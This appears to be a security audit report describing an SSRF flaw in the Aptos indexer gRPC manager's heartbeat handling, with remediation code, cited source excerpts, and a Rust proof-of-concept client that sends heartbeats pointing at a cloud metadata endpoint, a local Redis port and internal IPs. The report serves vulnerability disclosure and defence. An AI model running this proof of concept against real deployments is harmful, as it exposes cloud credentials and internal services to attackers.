# Audit Report

## Title
Server-Side Request Forgery (SSRF) via Unvalidated ServiceInfo Address Field in Indexer gRPC Manager

## Summary
The `ServiceInfo` struct's `address` field in the indexer gRPC system accepts arbitrary strings without validation, allowing attackers to cause the gRPC manager to make outbound connections to malicious URLs. This enables SSRF attacks targeting internal services, cloud metadata endpoints, and arbitrary network resources.

## Finding Description

The vulnerability exists in the indexer gRPC manager's heartbeat handling mechanism. When a `HeartbeatRequest` is received, the `ServiceInfo.address` field is extracted and used directly to create gRPC channels without any validation.

**Attack Flow:**

1. Attacker sends a `HeartbeatRequest` containing a `ServiceInfo` with a malicious `address` field (e.g., `"http://169.254.169.254/latest/meta-data/"`, `"http://localhost:6379"`, or internal IP addresses)

2. The address is extracted and passed to `handle_heartbeat()` [1](#0-0) 

3. Based on the info type, the handler creates a new service entry using the malicious address [2](#0-1) 

4. The service constructor (e.g., `LiveDataService::new()`) calls `Channel::from_shared(address)` with the unvalidated address string [3](#0-2) 

5. The address type is defined as a simple `String` alias with no validation [4](#0-3) 

6. The system's main loop periodically attempts to ping these registered services [5](#0-4) 

7. The ping operation makes an actual network request to the attacker-controlled URL [6](#0-5) 

8. The protobuf definition provides no validation or format requirements for the address field [7](#0-6) 

**Broken Invariants:**
- **Network Isolation**: The system makes unauthorized outbound connections to attacker-specified endpoints
- **Access Control**: Internal services become accessible through the compromised node
- **Resource Limits**: Attacker can cause resource exhaustion through connection attempts

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

1. **API Crashes**: The SSRF can cause the gRPC manager to crash when connecting to malformed or malicious endpoints
2. **Node Slowdowns**: Repeated connection attempts to slow or unresponsive endpoints degrade indexer performance
3. **Protocol Violations**: The heartbeat mechanism's trust model is violated by accepting arbitrary addresses

**Potential Attack Scenarios:**
- **Cloud Metadata Access**: On cloud deployments, access to `http://169.254.169.254/latest/meta-data/` can leak credentials and sensitive configuration
- **Internal Service Access**: Target internal services like Redis, databases, or admin panels (e.g., `http://localhost:6379`)
- **Port Scanning**: Enumerate internal network topology and open ports
- **Data Exfiltration**: Use the indexer as a proxy to exfiltrate data from internal networks

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity**: Low - requires only sending a single gRPC `HeartbeatRequest` with a crafted address
- **Authentication Required**: None - the heartbeat endpoint accepts requests from any source
- **Privileges Required**: None - any network peer can send heartbeat messages
- **User Interaction**: None - automatic exploitation through the main loop's periodic ping operations
- **Detectability**: Low - logs may show failed connections but won't necessarily identify malicious intent

The vulnerability is trivially exploitable by any attacker with network access to the gRPC manager endpoint.

## Recommendation

Implement strict validation of the `address` field before using it to create network connections:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs

fn validate_grpc_address(address: &str) -> Result<()> {
    // Parse the address to ensure it's a valid URL
    let uri = address.parse::<http::Uri>()
        .map_err(|e| anyhow::anyhow!("Invalid address format: {}", e))?;
    
    // Ensure scheme is https only for security
    if uri.scheme_str() != Some("https") && uri.scheme_str() != Some("http") {
        bail!("Invalid scheme: only http/https allowed");
    }
    
    // Get the host
    let host = uri.host()
        .ok_or_else(|| anyhow::anyhow!("No host in address"))?;
    
    // Block localhost, loopback, and private IP ranges
    if host == "localhost" || host == "127.0.0.1" || host.starts_with("127.") {
        bail!("Localhost addresses are not allowed");
    }
    
    // Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
    if let Ok(ip) = host.parse::<std::net::IpAddr>() {
        if is_private_ip(&ip) {
            bail!("Private IP addresses are not allowed");
        }
    }
    
    // Block cloud metadata endpoints
    if host.starts_with("169.254.") {
        bail!("Link-local addresses are not allowed");
    }
    
    Ok(())
}

fn is_private_ip(ip: &std::net::IpAddr) -> bool {
    match ip {
        std::net::IpAddr::V4(ipv4) => {
            ipv4.is_private() || ipv4.is_loopback() || ipv4.is_link_local()
        },
        std::net::IpAddr::V6(ipv6) => {
            ipv6.is_loopback() || ipv6.is_unique_local()
        },
    }
}

// Modify handle_heartbeat to validate before processing
pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
    // Validate address before use
    validate_grpc_address(&address)?;
    
    match info {
        Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
        Info::HistoricalDataServiceInfo(info) => {
            self.handle_historical_data_service_info(address, info)
        },
        Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
        Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
    }
}
```

Additionally, implement an allowlist approach where only explicitly configured peer addresses are accepted.

## Proof of Concept

```rust
// PoC: Malicious gRPC client exploiting SSRF
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest,
    LiveDataServiceInfo,
    ServiceInfo,
    StreamInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target gRPC manager
    let channel = Channel::from_static("http://target-grpc-manager:50051")
        .connect()
        .await?;
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Craft malicious HeartbeatRequest with SSRF payload
    let malicious_addresses = vec![
        "http://169.254.169.254/latest/meta-data/", // AWS metadata
        "http://localhost:6379",                     // Internal Redis
        "http://10.0.0.5:8080",                     // Internal service
    ];
    
    for address in malicious_addresses {
        let service_info = ServiceInfo {
            address: Some(address.to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1,
                timestamp: Some(timestamp_now_proto()),
                known_latest_version: Some(1000),
                stream_info: Some(StreamInfo {
                    active_streams: vec![],
                }),
                min_servable_version: Some(0),
            })),
        };
        
        let request = HeartbeatRequest {
            service_info: Some(service_info),
        };
        
        // Send malicious heartbeat - the server will attempt to connect back
        match client.heartbeat(request).await {
            Ok(_) => println!("SSRF payload sent: {}", address),
            Err(e) => println!("Error sending payload {}: {}", address, e),
        }
    }
    
    println!("SSRF attack initiated. The server will now attempt connections to malicious addresses.");
    println!("Check server logs and network traffic to confirm SSRF execution.");
    
    Ok(())
}
```

**Expected Behavior:** The gRPC manager accepts the heartbeat requests and creates gRPC clients pointing to the malicious addresses. Within seconds (based on the 5-second ping interval), the manager attempts to connect to these addresses, resulting in SSRF.

**Notes**

This vulnerability affects the Aptos indexer infrastructure but does not directly impact consensus or blockchain state. However, it poses significant security risks to the indexer infrastructure deployment, particularly in cloud environments where metadata endpoints can be exploited. The issue demonstrates a failure to validate external input before using it for network operations, a critical security oversight in distributed systems.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L116-121)
```rust
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L89-102)
```rust
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = DataServiceClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L235-247)
```rust
                    if need_ping {
                        let address = address.clone();
                        let client = live_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) =
                                self.ping_live_data_service(address.clone(), client).await
                            {
                                warn!("Failed to ping live data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged live data service ({address}).");
                            }
                        });
                    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L445-465)
```rust
    async fn ping_live_data_service(
        &self,
        address: GrpcAddress,
        mut client: DataServiceClient<Channel>,
    ) -> Result<()> {
        let request = PingDataServiceRequest {
            known_latest_version: Some(self.get_known_latest_version()),
            ping_live_data_service: true,
        };
        let response = client.ping(request).await?;
        if let Some(info) = response.into_inner().info {
            match info {
                aptos_protos::indexer::v1::ping_data_service_response::Info::LiveDataServiceInfo(info) => {
                    self.handle_live_data_service_info(address, info)
                },
                _ => bail!("Bad response."),
            }
        } else {
            bail!("Bad response.")
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-508)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L16-16)
```rust
pub(crate) type GrpcAddress = String;
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L64-72)
```text
message ServiceInfo {
  optional string address = 1;
  oneof info {
      LiveDataServiceInfo live_data_service_info = 2;
      HistoricalDataServiceInfo historical_data_service_info = 3;
      FullnodeInfo fullnode_info = 4;
      GrpcManagerInfo grpc_manager_info = 5;
  }
}
```
